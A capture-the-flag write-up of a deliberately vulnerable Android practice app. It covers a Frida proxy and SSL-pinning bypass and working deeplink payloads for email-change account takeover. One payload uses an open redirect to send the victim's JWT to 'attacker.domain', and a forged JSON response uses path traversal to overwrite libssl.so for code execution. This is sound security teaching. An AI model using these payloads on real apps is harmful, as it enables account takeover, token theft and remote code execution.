# dPhoeniixx Android Challenge Writeup

Hi! In this article, we will discuss the android challenge from [@dPhoeniixx](https://www.facebook.com/dphoeniixx/posts/pfbid0GHuuHZ2BF7dPCsP53qceJHd5WkztNngXoECZCvVa37ct9xRev94KxUryby6mBCuGl) which has 3 vulnerabilities one of them is RCE, and all three exploits will be via Mobile request forgery which got explained by @dPhoeniixx in a blog [post](https://dphoeniixx.medium.com/exploiting-request-forgery-on-mobile-applications-e1d196d187b3).

now let's [download](https://drive.google.com/file/d/1HDxXOx-88PVWEDpTrPN_tktvOz8rkwvx/view) the APK and install it, the application's main activity shows two buttons and a list of blogs we can create an account and login into it by clicking the login button to get a new profile page that displays the user's info and function to change the user's email this function seems to be hackable we need to see the app traffic to try to abuse this function and change the email without victim's intended.

### Non proxy aware app
at first, we should set up a proxy of Burp Suite to get the app traffic, I used my preferred method via the ProxyDroid app to make the proxy for only the targeted app but I got no requests and the app works normally so I added a global proxy in the WIFI advanced setting as the normal way but the same behavior no traffic obviously, this app is Non-Proxy-Aware we should add the proxy in a different way.

by analyzing the app source code in jadx-gui we can find the app uses OkHttp3 as an HTTP client, we can use Frida to add the proxy as a function argument to resetNextProxy(HttpUrl , Proxy) in the class okhttp3.internal.http.RouteSelector by using the Frida script below

```javascript
let RouteSelector = Java.use("okhttp3.internal.http.RouteSelector");
		RouteSelector["resetNextProxy"].implementation = function (httpUrl, proxy) {
			console.log('resetNextProxy is called' + ', ' + 'httpUrl: ' + httpUrl + ', ' + 'proxy: ' + proxy);
			var Proxy = Java.use("java.net.Proxy");
			var ProxyType = Java.use("java.net.Proxy$Type");
			var InetSocketAddress = Java.use("java.net.InetSocketAddress");
			var proxy = Proxy.$new(ProxyType.HTTP.value, InetSocketAddress.createUnresolved("192.168.1.5", 8080)); //Burp proxy listener
			let ret = this.resetNextProxy(httpUrl, proxy);
			console.log('resetNextProxy ret value is ' + ret);
			return ret;
		};
```

![](https://i.imgur.com/qtP3eNy.png)


### Custom SSL pinning 
unfortunately, I got no traffic also but the app stopped showing the blogs and profile data, Ok at least there is a different behavior

![](https://i.imgur.com/K90wqUp.png)

back to the burp to see the error 
`The client failed to negotiate a TLS connection to 52.139.154.230:8443: Remote host terminated the handshake` 

![](https://i.imgur.com/dQq24lj.png)

this means that the app has an SSL pinning and I should bypass it to see the app traffic, there are a lot of ways to bypass the common SSL pinning mechanisms such as Frida scripts and Xposed Modules, I prefer the first way with Frida and especially this [script](https://codeshare.frida.re/@akabe1/frida-multiple-unpinning/)  that not only bypass the common SSL pinning but also tries to find and bypass the custom mechanisms, so I added proxy setter code above at the beginning of this SSL pinning bypass script and launched the app using Frida
![](https://i.imgur.com/44cSM1p.png)

The same TLS connection error still shows but the Frida script says `Unexpected SSLPeerUnverifiedException occurred` and uncommon SSL Pinning method located in `okhttp3.internal.io.RealConnection.connectTls` 

![](https://i.imgur.com/IYjkvXS.png)
navigate to connectTls method 

![](https://i.imgur.com/vefkBEX.png)
the method responsible for making the TLS connection, I searched for where this method gets called and I find only one call 

![](https://i.imgur.com/yyd2wry.png)
So I simply used Frida again to make the sslSocketFactory() method returns null to make the condition always false and avoid calling this method at all

![](https://i.imgur.com/RLe3G36.png)

now let's add the code above to the Frida script and launch the app through it, and finally, the traffic got captured in Burp
![](https://i.imgur.com/JFB1FdN.png)

but I have to change the http to https manually before forwarding the request
![](https://i.imgur.com/1ZYNLMQ.png)


### Change the victim's email leads to account takeover
now let's check the request of changing the email address, as shown below the new email address passed as value for the parameter `email` through a POST request, if we are able to use the Mobile request forgery attack to make the victim send this request with the attacker's email address as an email parameter value this will lead to account takeover in real scenarios
![](https://i.imgur.com/HRTOntz.png)

back to jadx-gui to take a look at the `AndroidManifest.xml` file, the MainActivity has deeplink specified in the intent-filter shown below with scheme `mrf` and host `dphoeniixx`
![](https://i.imgur.com/EKn3TyL.png)

Back to the MainActivity source code to find the deeplink handler
![](https://i.imgur.com/BQe2Qpd.png)

in the `DeeplinkHandler` class there are three deeplink regex and methods handleHome, handleBlog, and handleRedeem
![](https://i.imgur.com/izDGFHi.png)

 the three methods body is located in the `DeeplinkHandlers` class, by looking at the `handleRedeem` method takes a parameter called `code` 
![](https://i.imgur.com/dAiRwHL.png)

that will call the method redeem in the `RESTClient` class and pass the code parameter value to make a POST request to `/api/v1/user/redeem/codeValue`
![](https://i.imgur.com/ziyvJ4T.png)

now let's make an HTML code that uses this deeplink and make the POST request to `/api/v1/user/redeem/codeValue`

```HTML
<!DOCTYPE html>
<html>
<body>
<a href="mrf://dphoeniixx/redeem?code=redeem123">Redeem</a>
</body>
</html>
```
open this HTML file in the user's browser and click the Redeem link 

![](https://i.imgur.com/RiXwrVh.png)

the app will be launched and a POST request to`/api/v1/user/redeem/redeem123` will be sent

![](https://i.imgur.com/rwPaVP3.png)

while the redeem method accepts any value for the code parameter we can pass a path traversal payload as the code parameter value to make the POST request goes to `/api/v1/user/update` but the update endpoint takes the `email` parameter in the request body, not in URL like the redeem endpoint

![](https://i.imgur.com/HRTOntz.png)

we can workaround that by sending the email parameter in the URL and the backend will accept that and change the user's email normally
![](https://i.imgur.com/IWNTwns.png)

let's try the payload below
```HTML
<!DOCTYPE html>
<html>
<body>
<a href="mrf://dphoeniixx/redeem?code=../update?email=attacker@domain.com">Redeem</a>
</body>
</html>
```
the payload works and the victim's email has been changed
![](https://i.imgur.com/F7lGz5w.png)

![](https://i.imgur.com/P6OhcZH.png)

and this was the first vulnerability

### Leak the Victim's Authorization Token

let's check the other deeplink hander methods, the `handleBlog` method will launch the BlogpostActivity and pass the second segment from the deeplink URI which is a user controlled input in the deeplink regex, in normal this input should be the blog id
![](https://i.imgur.com/7wWPcUA.png)
then the BlogpostActivity sends a GET request to `/api/v1/blogs/blogID` to get the blog info such as title, description, and image URL
```HTML
<!DOCTYPE html>
<html>
<body>
<a href="mrf://dphoeniixx/blog/640f4199259ed37178284e6f">Blog</a>
</body>
</html>
```
![](https://i.imgur.com/rknFp37.png)

as you see in the image the GET request goes to `/api/v1/blogs/640f4199259ed37178284e6f` and you can see also that the request was sent with the user's JWT in the `Authorization` header, so if we could redirect this request to the attacker's domain the victim's authorization token will be leaked, this means that we must find an open redirect vulnerability in order to use it to direct the request to the attacker's domain.

navigating to the API path `https://52.139.154.230:8443/api/v1` will list all the API available endpoints including the `GET /redirect/:path` and as described this endpoint will redirect to /:path

![](https://i.imgur.com/gGxifxb.png)

after testing some of the common open redirect payloads I found that the URL `https://52.139.154.230:8443/api/v1/redirect/%2f%2fexample.com` will redirect the user to `https://example.com/` by combining this with the blog post deeplink we can redirect the endpoint`/api/v1/blogs/blogID` to the attacker's domain with the victim's authorization token (the attacker's domain must support https)

```HTML
<!DOCTYPE html>
<html>
<body>
<a href="mrf://dphoeniixx/blog/..%2fredirect%2f%252f%252fattacker.domain">Blog</a>
</body>
</html>
```
![](https://i.imgur.com/geHesgN.png)

the victim's authorization token sent to the attacker's domain
![](https://i.imgur.com/0OGmu3x.png)

and this is the second vulnerability 

### Overwriting The Application Files Leads to RCE
We are still in the `handleBlog` deeplink handler after the blog post info gets returned in the JSON response of `GET /api/v1/blogs/blogID` 
![](https://i.imgur.com/WKtVRp4.png)

blog image will be downloaded from the link returned as the value of `image` key
![](https://i.imgur.com/Qi3oYot.png)
![](https://i.imgur.com/ZEf28mk.png)

the downloaded images will be saved in the path `/data/data/com.dphoeniixx.mrfpractice/cache/image-cache/FILE_NAME_MD5/filename` 
![](https://i.imgur.com/ZL0meAm.png)

we can use the same open redirect used before to redirect the request `GET /api/v1/blogs/blogID` to the attacker's domain and return a manipulated response with an image URL that includes a path traversal payload to overwrite any file inside the application's writable directories, by hosting the JSON below on the attacker's domain and redirect the victim to the JSON link, the `libssl.so` file in the path `/data/data/com.dphoeniixx.mrfpractice/libs/arm64-v8a/libssl.so` will be overwritten with another file includes a malicious code or reverse shell payload

```JSON
{
    "status": "success",
    "data": {
        "_id": "640f4199259ed37178284e6f",
        "title": "First Blog",
        "description": "Test First blog",
        "image": "https://attacker.domain/x/x/x/..%2f..%2f..%2flibs%2farm64-v8a%2flibssl.so",
        "tags": [],
        "author": "640f4067259ed37178284e69",
        "createdAt": "2023-03-13T15:30:33.477Z",
        "updatedAt": "2023-03-13T15:30:33.477Z"
    }
}
```
the HTML below will redirect the victim to the manipulated JSON link

```HTML
<!DOCTYPE html>
<html>
<body>
<a href="mrf://dphoeniixx/blog/..%2fredirect%2f%252f%252fattacker.domain%252fpayload.json">Blog</a>
</body>
</html>
```
![](https://i.imgur.com/A7OPgO9.png)

next time the app gets launched the malicious `libssl.so` payload will be executed
![](https://i.imgur.com/SdMF2yi.png)

And this was the RCE vulnerability






